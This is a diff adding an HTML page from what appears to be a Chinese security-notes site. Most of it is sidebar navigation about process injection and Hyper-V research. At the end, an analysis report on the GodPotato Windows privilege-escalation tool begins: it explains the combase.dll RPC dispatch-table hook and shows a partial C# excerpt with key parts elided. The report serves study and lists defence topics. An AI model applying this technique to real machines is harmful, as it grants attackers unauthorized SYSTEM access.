+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_10">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    进程注入
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/Hollowing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hollowing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/Inject%20DLL/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Inject DLL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/Inject%20by%20callback/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Inject by callback
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/Windows%20Thread%20Pool/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows Thread Pool
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/inject%20by%20thread/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    process hypnosis injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/%E9%80%9A%E7%94%A8%E6%A3%80%E6%B5%8B/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    进程创建 suspend 检测
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hyperv docs
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Hyperv docs
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../hyperv%20docs/Hyper-V%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%B4%A2%E5%BC%95/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hyper-V 基础知识索引
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../hyperv%20docs/Hyper-V%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E7%B4%A2%E5%BC%95/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hyper-V 安全研究索引
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../hyperv%20docs/Hyper-V%E6%8A%80%E6%9C%AF%E5%BA%94%E7%94%A8%E7%94%9F%E6%80%81/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hyper-V 技术应用生态
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_4" id="__nav_4_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Code samples
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Code samples
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../hyperv%20docs/code-samples/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hyper-V PowerShell 代码示例索引
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_5" id="__nav_4_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web articles
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web articles
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../hyperv%20docs/web%20articles/hyper-v%20%E5%86%85%E9%83%A8%E5%8E%9F%E7%90%86/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hyper-V Internals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../hyperv%20docs/web%20articles/hyper-v-research/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hyper-V Research
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../hyperv%20docs/web%20articles/%E5%85%B3%E4%BA%8EHyper-V%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    关于Hyper-V的一些理解
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../hyperv%20docs/web%20articles/%E5%88%86%E6%9E%90%20hyper-v-research/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hyper-V Research 文章总结
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_5_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_5_5" id="__nav_4_5_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    看雪文章
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_5_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_5_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    看雪文章
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_5_5_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_5_5_1" id="__nav_4_5_5_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    hyper V 漏洞挖掘 0 5
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_4_5_5_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_5_5_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    hyper V 漏洞挖掘 0 5
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../hyperv%20docs/web%20articles/%E7%9C%8B%E9%9B%AA%E6%96%87%E7%AB%A0/hyper-V%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%200-5/0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    看雪安全社区｜非营利性质的安全技术交流平台
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../hyperv%20docs/web%20articles/%E7%9C%8B%E9%9B%AA%E6%96%87%E7%AB%A0/hyper-V%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%200-5/1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    看雪安全社区｜非营利性质的安全技术交流平台
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../hyperv%20docs/web%20articles/%E7%9C%8B%E9%9B%AA%E6%96%87%E7%AB%A0/hyper-V%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%200-5/2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../hyperv%20docs/web%20articles/%E7%9C%8B%E9%9B%AA%E6%96%87%E7%AB%A0/hyper-V%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%200-5/3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    看雪安全社区｜非营利性质的安全技术交流平台
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../hyperv%20docs/web%20articles/%E7%9C%8B%E9%9B%AA%E6%96%87%E7%AB%A0/hyper-V%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%200-5/4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    看雪安全社区｜非营利性质的安全技术交流平台
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../hyperv%20docs/web%20articles/%E7%9C%8B%E9%9B%AA%E6%96%87%E7%AB%A0/hyper-V%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%200-5/5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    看雪安全社区｜非营利性质的安全技术交流平台
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../hyperv%20docs/web%20articles/%E7%9C%8B%E9%9B%AA%E6%96%87%E7%AB%A0/hyper-V%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%200-5/LLM%E5%88%86%E6%9E%90%201/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LLM分析 1.md
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../hyperv%20docs/web%20articles/%E7%9C%8B%E9%9B%AA%E6%96%87%E7%AB%A0/hyper-V%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%200-5/LLM%E5%88%86%E6%9E%90%203/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LLM分析 3
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../hyperv%20docs/web%20articles/%E7%9C%8B%E9%9B%AA%E6%96%87%E7%AB%A0/hyper-V%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%200-5/LLM%E5%88%86%E6%9E%90%204/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LLM分析：Hyper-V安全从0到1(4) - Part 1
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../hyperv%20docs/web%20articles/%E7%9C%8B%E9%9B%AA%E6%96%87%E7%AB%A0/hyper-V%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%200-5/LLM%E5%88%86%E6%9E%90%205/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LLM分析 5.md
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../hyperv%20docs/web%20articles/%E7%9C%8B%E9%9B%AA%E6%96%87%E7%AB%A0/hyper-V%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%200-5/%E9%83%A8%E5%88%86%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hyper-V 学习笔记
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        项目概述
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能分析
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="功能分析">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-rpchook" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能1: RPC运行时库Hook
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="功能1: RPC运行时库Hook">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能目的
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实现方式
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-rpc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能2: 自定义RPC端点解析
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="功能2: 自定义RPC端点解析">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能目的
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实现方式
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-objrefdcom" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能3: OBJREF构造与DCOM触发
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="功能3: OBJREF构造与DCOM触发">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能目的
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实现方式
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能4: 命名管道服务器
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="功能4: 命名管道服务器">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能目的
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实现方式
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能5: 令牌搜索与提升
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="功能5: 令牌搜索与提升">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能目的
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实现方式
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能6: 高权限进程创建
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="功能6: 高权限进程创建">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能目的
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实现方式
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        功能组合使用分析
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="功能组合使用分析">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        组合流程
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        组合目的
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        技术学习要点
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="技术学习要点">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-dcomoxid" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. DCOM/OXID解析机制
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-rpc_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. RPC运行时库内部结构
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Windows令牌体系
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. 系统句柄枚举技术
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-commoniker" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. COM/Moniker编程
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. 攻击检测与防御
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#potato" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        与其他Potato技术的对比
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        总结
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="godpotato">GodPotato 项目分析报告</h1>
+<h2 id="_1">项目概述</h2>
+<p>GodPotato是一个Windows本地提权工具，基于DCOM/COM机制实现权限提升。该项目通过Hook RPC运行时库(combase.dll)中的函数，结合DCOM对象引用(OBJREF)构造和命名管道模拟，实现从普通用户权限提升到SYSTEM权限。</p>
+<p><strong>项目来源</strong>: https://github.com/BeichenDream/GodPotato
+<strong>适用系统</strong>: Windows 2012-2019, Windows 8-10
+<strong>开发语言</strong>: C# (.NET Framework 2.0)
+<strong>核心依赖</strong>: SharpToken (令牌操作库)</p>
+<hr />
+<h2 id="_2">功能分析</h2>
+<h3 id="1-rpchook">功能1: RPC运行时库Hook</h3>
+<h4 id="_3">功能目的</h4>
+<p>通过修改combase.dll中的RPC服务器接口分发表(Dispatch Table)，将特定的RPC函数调用重定向到攻击者控制的代码，从而控制DCOM连接解析过程。</p>
+<h4 id="_4">实现方式</h4>
+<p><strong>代码位置</strong>: <a href="GodPotato/NativeAPI/GodPotatoContext.cs:131-175"><code>NativeAPI/GodPotatoContext.cs</code></a></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-0-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-0-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-0-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-0-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-0-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-0-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-0-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-0-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-0-10">10</a></span>
+<span class="normal"><a href="#__codelineno-0-11">11</a></span>
+<span class="normal"><a href="#__codelineno-0-12">12</a></span>
+<span class="normal"><a href="#__codelineno-0-13">13</a></span>
+<span class="normal"><a href="#__codelineno-0-14">14</a></span>
+<span class="normal"><a href="#__codelineno-0-15">15</a></span>
+<span class="normal"><a href="#__codelineno-0-16">16</a></span>
+<span class="normal"><a href="#__codelineno-0-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="k">protected</span><span class="w"> </span><span class="k">void</span><span class="w"> </span><span class="nf">InitContext</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2"></a><span class="w">    </span><span class="n">ProcessModuleCollection</span><span class="w"> </span><span class="n">processModules</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Process</span><span class="p">.</span><span class="n">GetCurrentProcess</span><span class="p">().</span><span class="n">Modules</span><span class="p">;</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3"></a><span class="w">    </span><span class="k">foreach</span><span class="w"> </span><span class="p">(</span><span class="n">ProcessModule</span><span class="w"> </span><span class="n">processModule</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">processModules</span><span class="p">)</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="w">    </span><span class="p">{</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">processModule</span><span class="p">.</span><span class="n">ModuleName</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="k">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">processModule</span><span class="p">.</span><span class="n">ModuleName</span><span class="p">.</span><span class="n">ToLower</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&quot;combase.dll&quot;</span><span class="p">)</span>
+<a id="__codelineno-0-6" name="__codelineno-0-6"></a><span class="w">        </span><span class="p">{</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="w">            </span><span class="n">CombaseModule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">processModule</span><span class="p">.</span><span class="n">BaseAddress</span><span class="p">;</span>
+<a id="__codelineno-0-8" name="__codelineno-0-8"></a><span class="w">            </span><span class="c1">// 搜索特定RPC接口</span>
+<a id="__codelineno-0-9" name="__codelineno-0-9"></a><span class="w">            </span><span class="kt">var</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Sunday</span><span class="p">.</span><span class="n">Search</span><span class="p">(</span><span class="n">dllContent</span><span class="p">,</span><span class="w"> </span><span class="n">patternStream</span><span class="p">.</span><span class="n">ToArray</span><span class="p">());</span>
+<a id="__codelineno-0-10" name="__codelineno-0-10"></a><span class="w">            </span><span class="c1">// 获取分发表指针</span>
+<a id="__codelineno-0-11" name="__codelineno-0-11"></a><span class="w">            </span><span class="n">RPC_SERVER_INTERFACE</span><span class="w"> </span><span class="n">rpcServerInterface</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">RPC_SERVER_INTERFACE</span><span class="p">)</span><span class="n">Marshal</span><span class="p">.</span><span class="n">PtrToStructure</span><span class="p">(...);</span>
+<a id="__codelineno-0-12" name="__codelineno-0-12"></a><span class="w">            </span><span class="n">MIDL_SERVER_INFO</span><span class="w"> </span><span class="n">midlServerInfo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">MIDL_SERVER_INFO</span><span class="p">)</span><span class="n">Marshal</span><span class="p">.</span><span class="n">PtrToStructure</span><span class="p">(...);</span>
+<a id="__codelineno-0-13" name="__codelineno-0-13"></a><span class="w">            </span><span class="n">DispatchTablePtr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">midlServerInfo</span><span class="p">.</span><span class="n">DispatchTable</span><span class="p">;</span>
+<a id="__codelineno-0-14" name="__codelineno-0-14"></a><span class="w">            </span><span class="n">UseProtseqFunctionPtr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dispatchTable</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<a id="__codelineno-0-15" name="__codelineno-0-15"></a><span class="w">        </span><span class="p">}</span>
+<a id="__codelineno-0-16" name="__codelineno-0-16"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-0-17" name="__codelineno-0-17"></a><span class="p">}</span>
+</code></pre></div></td></tr></table></div>
